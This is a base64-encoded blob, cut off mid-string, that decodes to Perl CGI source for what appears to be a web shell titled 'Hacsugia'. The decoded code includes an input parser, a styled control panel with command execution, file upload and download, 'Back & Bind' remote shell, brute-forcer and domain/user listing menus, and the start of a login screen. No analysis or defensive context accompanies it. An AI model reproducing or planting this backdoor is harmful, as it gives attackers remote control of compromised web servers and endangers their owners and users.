QojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQNCiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlwYXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4NCiMgVGhlIGZpbGVuYW1lIGlzIHN0b3JlZCBpbiAkaW57J2YnfSBhbmQgdGhlIGRhdGEgaXMgc3RvcmVkIGluICRpbnsnZmlsZWRhdGEnfS4NCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YNCiMgdGhlIHZhcmlhYmxlLiBOb3RlOiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBDR0kNCiMgc2NyaXB0cy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSZWFkUGFyc2UgDQp7DQoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOw0KCQ0KCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KDQoJaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0NCgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoNCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhDQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pDQoJew0KCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IA0KCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyANCgkJJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KCQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IA0KCQkkaW57J2YnfSA9ICQxOyANCgkJJGlueydmJ30gPX4gcy9cIi8vZzsNCgkJJGlueydmJ30gPX4gcy9ccy8vZzsNCg0KCQkjIHBhcnNlIHRyYWlsZXINCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCgkJeyANCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOyANCgkJfQ0KCX0NCgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkNCgl7DQoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsNCgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQ0KCQl7DQoJCQkkaW5bJGldID1+IHMvXCsvIC9nOw0KCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsNCgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7DQoJCQkkaW57JGtleX0gLj0gJHZhbDsNCgkJfQ0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KCSRFbmNvZGVkQ3VycmVudERpciA9ICRDdXJyZW50RGlyOw0KCSRFbmNvZGVkQ3VycmVudERpciA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJbXkgJGRpciA9JEN1cnJlbnREaXI7DQoJJGRpcj1+IHMvXFwvXFxcXC9nOw0KCXByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxuXG4iOw0KCXByaW50IDw8RU5EOw0KPGh0bWw+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4NCjx0aXRsZT5IYWNzdWdpYTwvdGl0bGU+DQoNCiRIdG1sTWV0YUhlYWRlcg0KDQo8L2hlYWQ+DQo8c3R5bGU+DQpib2R5ew0KZm9udDogMTBwdCBWZXJkYW5hOw0KfQ0KdHIgew0KQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7DQpjb2xvcjogI2ZmOTkwMDsNCn0NCnRkIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KY29sb3I6ICMyQkE4RUM7DQpmb250OiAxMHB0IFZlcmRhbmE7DQp9DQoNCnRhYmxlIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KQkFDS0dST1VORC1DT0xPUjogIzExMTsNCn0NCg0KDQppbnB1dCB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOw0KZm9udDogMTBwdCBWZXJkYW5hOw0KY29sb3I6ICNmZjk5MDA7DQp9DQoNCmlucHV0LnN1Ym1pdCB7DQp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQpjb2xvcjogI0ZGRkZGRjsNCmJvcmRlci1jb2xvcjogIzAwOTkwMDsNCn0NCg0KY29kZSB7DQpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsNCkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOw0KZm9udDogMTBwdCBWZXJkYW5hIGJvbGQ7DQpjb2xvcjogd2hpbGU7DQp9DQoNCnJ1biB7DQpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsNCmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOw0KY29sb3I6ICNGRjAwQUE7DQp9DQoNCnRleHRhcmVhIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KQkFDS0dST1VORC1DT0xPUjogIzFiMWIxYjsNCmZvbnQ6IEZpeGVkc3lzIGJvbGQ7DQpjb2xvcjogI2FhYTsNCn0NCkE6bGluayB7DQoJQ09MT1I6ICMyQkE4RUM7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTp2aXNpdGVkIHsNCglDT0xPUjogIzJCQThFQzsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmhvdmVyIHsNCgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQoJY29sb3I6ICNmZjk5MDA7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTphY3RpdmUgew0KCWNvbG9yOiBSZWQ7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KDQoubGlzdGRpciB0cjpob3ZlcnsNCgliYWNrZ3JvdW5kOiAjNDQ0Ow0KfQ0KLmxpc3RkaXIgdHI6aG92ZXIgdGR7DQoJYmFja2dyb3VuZDogIzQ0NDsNCgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQoJY29sb3I6ICNGRkZGRkY7IFRFWFQtREVDT1JBVElPTjogbm9uZTsNCn0NCi5ub3RsaW5lew0KCWJhY2tncm91bmQ6ICMxMTE7DQp9DQoubGluZXsNCgliYWNrZ3JvdW5kOiAjMjIyOw0KfQ0KPC9zdHlsZT4NCjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPg0KZnVuY3Rpb24gY2htb2RfZm9ybShpLGZpbGUpDQp7DQoJLyp2YXIgYWpheD0nYWpheF9Qb3N0RGF0YSgiRm9ybVBlcm1zXycraSsnIiwiJFNjcmlwdExvY2F0aW9uIiwiUmVzcG9uc2VEYXRhIik7IHJldHVybiBmYWxzZTsnOyovDQoJdmFyIGFqYXg9IiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVQZXJtc18iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYWpheCArICInIHZhbHVlPU9LPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0ZXh0XyIgKyBpKS5mb2N1cygpOw0KfQ0KZnVuY3Rpb24gcm1fY2htb2RfZm9ybShyZXNwb25zZSxpLHBlcm1zLGZpbGUpDQp7DQoJcmVzcG9uc2UuaW5uZXJIVE1MID0gIjxzcGFuIG9uY2xpY2s9XFxcImNobW9kX2Zvcm0oIiArIGkgKyAiLCciKyBmaWxlKyAiJylcXFwiID4iKyBwZXJtcyArIjwvc3Bhbj48L3RkPiI7DQp9DQpmdW5jdGlvbiByZW5hbWVfZm9ybShpLGZpbGUsZikNCnsNCgl2YXIgYWpheD0iIjsNCglmLnJlcGxhY2UoL1xcXFwvZywiXFxcXFxcXFwiKTsNCgl2YXIgYmFjaz0icm1fcmVuYW1lX2Zvcm0oIitpKyIsXFxcIiIrZmlsZSsiXFxcIixcXFwiIitmKyJcXFwiKTsgcmV0dXJuIGZhbHNlOyI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPXJlbmFtZSB0eXBlPXRleHQgdmFsdWU9ICciK2ZpbGUrIicgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGFqYXggKyAiJyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGJhY2sgKyAiJyB2YWx1ZT1DYW5jZWw+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nZ3VpJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSckZGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7DQp9DQpmdW5jdGlvbiBybV9yZW5hbWVfZm9ybShpLGZpbGUsZikNCnsNCglpZihmPT0nZicpDQoJew0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Y29tbWFuZCZkPSRkaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsNCgl9ZWxzZQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOw0KCX0NCn0NCjwvc2NyaXB0Pg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiMwYzBjMGMiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCI+DQo8Y2VudGVyPjxjb2RlPg0KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8dHI+DQoJPHRkIGFsaWduPSJjZW50ZXIiIHJvd3NwYW49Mj4NCgkJPGI+PGZvbnQgc2l6ZT0iNSI+JEVkaXRQZXJzaW9uPC9mb250PjwvYj4NCgk8L3RkPg0KDQoJPHRkPg0KDQoJCTxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPiRFTlZ7IlNFUlZFUl9TT0ZUV0FSRSJ9PC9mb250Pg0KCTwvdGQ+DQoJPHRkPlNlcnZlciBJUDo8Zm9udCBjb2xvcj0iI2JiMDAwMCI+ICRFTlZ7J1NFUlZFUl9BRERSJ308L2ZvbnQ+IHwgWW91ciBJUDogPGZvbnQgY29sb3I9IiNiYjAwMDAiPiRFTlZ7J1JFTU9URV9BRERSJ308L2ZvbnQ+DQoJPC90ZD4NCg0KPC90cj4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjMiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uIj5Ib21lPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y29tbWFuZCZkPSRFbmNvZGVkQ3VycmVudERpciI+Q29tbWFuZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Z3VpJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5HVUk8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT11cGxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPlVwbG9hZCBGaWxlPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwNCg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YmFja2JpbmQiPkJhY2sgJiBCaW5kPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1icnV0ZWZvcmNlciI+QnJ1dGUgRm9yY2VyPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1jaGVja2xvZyI+Q2hlY2sgTG9nPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb21haW5zdXNlciI+RG9tYWlucy9Vc2VyczwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5Mb2dvdXQ8L2E+IHwNCjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSIjIj5IZWxwPC9hPg0KDQo8L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNmZjk5Y2MiID4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KDQoJcHJpbnQgPDxFTkQ7DQo8cHJlPjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NClR5cGluZ1RleHQgPSBmdW5jdGlvbihlbGVtZW50LCBpbnRlcnZhbCwgY3Vyc29yLCBmaW5pc2hlZENhbGxiYWNrKSB7DQogIGlmKCh0eXBlb2YgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQgPT0gInVuZGVmaW5lZCIpIHx8ICh0eXBlb2YgZWxlbWVudC5pbm5lckhUTUwgPT0gInVuZGVmaW5lZCIpKSB7DQogICAgdGhpcy5ydW5uaW5nID0gdHJ1ZTsJLy8gTmV2ZXIgcnVuLg0KICAgIHJldHVybjsNCiAgfQ0KICB0aGlzLmVsZW1lbnQgPSBlbGVtZW50Ow0KICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2sgPSAoZmluaXNoZWRDYWxsYmFjayA/IGZpbmlzaGVkQ2FsbGJhY2sgOiBmdW5jdGlvbigpIHsgcmV0dXJuOyB9KTsNCiAgdGhpcy5pbnRlcnZhbCA9ICh0eXBlb2YgaW50ZXJ2YWwgPT0gInVuZGVmaW5lZCIgPyAxMDAgOiBpbnRlcnZhbCk7DQogIHRoaXMub3JpZ1RleHQgPSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MOw0KICB0aGlzLnVucGFyc2VkT3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0Ow0KICB0aGlzLmN1cnNvciA9IChjdXJzb3IgPyBjdXJzb3IgOiAiIik7DQogIHRoaXMuY3VycmVudFRleHQgPSAiIjsNCiAgdGhpcy5jdXJyZW50Q2hhciA9IDA7DQogIHRoaXMuZWxlbWVudC50eXBpbmdUZXh0ID0gdGhpczsNCiAgaWYodGhpcy5lbGVtZW50LmlkID09ICIiKSB0aGlzLmVsZW1lbnQuaWQgPSAidHlwaW5ndGV4dCIgKyBUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCsrOw0KICBUeXBpbmdUZXh0LmFsbC5wdXNoKHRoaXMpOw0KICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsNCiAgdGhpcy5pblRhZyA9IGZhbHNlOw0KICB0aGlzLnRhZ0J1ZmZlciA9ICIiOw0KICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOw0KICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiIjsNCn0NClR5cGluZ1RleHQuYWxsID0gbmV3IEFycmF5KCk7DQpUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCA9IDA7DQpUeXBpbmdUZXh0LnJ1bkFsbCA9IGZ1bmN0aW9uKCkgew0KICBmb3IodmFyIGkgPSAwOyBpIDwgVHlwaW5nVGV4dC5hbGwubGVuZ3RoOyBpKyspIFR5cGluZ1RleHQuYWxsW2ldLnJ1bigpOw0KfQ0KVHlwaW5nVGV4dC5wcm90b3R5cGUucnVuID0gZnVuY3Rpb24oKSB7DQogIGlmKHRoaXMucnVubmluZykgcmV0dXJuOw0KICBpZih0eXBlb2YgdGhpcy5vcmlnVGV4dCA9PSAidW5kZWZpbmVkIikgew0KICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsJLy8gV2UgaGF2ZW4ndCBmaW5pc2hlZCBsb2FkaW5nIHlldC4gIEhhdmUgcGF0aWVuY2UuDQogICAgcmV0dXJuOw0KICB9DQogIGlmKHRoaXMuY3VycmVudFRleHQgPT0gIiIpIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSAiIjsNCi8vICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dC5yZXBsYWNlKC88KFtePF0pKj4vLCAiIik7ICAgICAvLyBTdHJpcCBIVE1MIGZyb20gdGV4dC4NCiAgaWYodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoKSB7DQogICAgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjwiICYmICF0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciA9ICI8IjsNCiAgICAgIHRoaXMuaW5UYWcgPSB0cnVlOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIj4iICYmIHRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyICs9ICI+IjsNCiAgICAgIHRoaXMuaW5UYWcgPSBmYWxzZTsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy50YWdCdWZmZXI7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICImIiAmJiAhdGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICImIjsNCiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gdHJ1ZTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI7IiAmJiB0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9ICI7IjsNCiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMuSFRNTEVudGl0eUJ1ZmZlcjsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSB7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgIH0NCiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gdGhpcy5jdXJyZW50VGV4dDsNCiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MICs9ICh0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGggLSAxID8gKHR5cGVvZiB0aGlzLmN1cnNvciA9PSAiZnVuY3Rpb24iID8gdGhpcy5jdXJzb3IodGhpcy5jdXJyZW50VGV4dCkgOiB0aGlzLmN1cnNvcikgOiAiIik7DQogICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsNCiAgfSBlbHNlIHsNCgl0aGlzLmN1cnJlbnRUZXh0ID0gIiI7DQoJdGhpcy5jdXJyZW50Q2hhciA9IDA7DQogICAgICAgIHRoaXMucnVubmluZyA9IGZhbHNlOw0KICAgICAgICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2soKTsNCiAgfQ0KfQ0KPC9zY3JpcHQ+DQo8L3ByZT4NCg0KPGZvbnQgc3R5bGU9ImZvbnQ6IDE1cHQgVmVyZGFuYTsgY29sb3I6IHllbGxvdzsiPkNvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhIDwvZm9udD48YnI+PGJyPg0KPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0iMSIgd2lkdGg9IjYwMCIgaGVpZ2g+DQo8dGJvZHk+PHRyPg0KPHRkIHZhbGlnbj0idG9wIiBiYWNrZ3JvdW5kPSJodHRwOi8vZGwuZHJvcGJveC5jb20vdS8xMDg2MDA1MS9pbWFnZXMvbWF0cmFuLmdpZiI+PHAgaWQ9ImhhY2siIHN0eWxlPSJtYXJnaW4tbGVmdDogM3B4OyI+DQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+IFBsZWFzZSBXYWl0IC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4NCg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPiBUcnlpbmcgY29ubmVjdCB0byBTZXJ2ZXIgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD48YnI+DQo8Zm9udCBjb2x